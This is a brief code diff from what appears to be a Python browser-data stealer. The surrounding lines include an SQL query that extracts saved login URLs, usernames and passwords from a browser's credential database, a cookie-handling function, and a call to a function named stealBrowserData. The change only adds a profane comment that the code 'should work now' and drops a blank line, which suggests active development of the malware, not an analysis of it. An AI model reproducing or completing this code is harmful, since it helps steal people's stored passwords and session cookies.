@@ -7,6 +7,8 @@ from subprocess import run, DEVNULL
 from tempfile import TemporaryDirectory, NamedTemporaryFile
 from datetime import datetime, timedelta
 
+#shit should work now
+
 data_queries = {
     'login_data': {
         'query': 'SELECT action_url, username_value, password_value FROM logins',
@@ -222,7 +224,6 @@ def browser_cookies():
                 os.rename(temp_file_path, new_file_path)
 
                 return new_file_path
-
 
     return stealBrowserData()
 
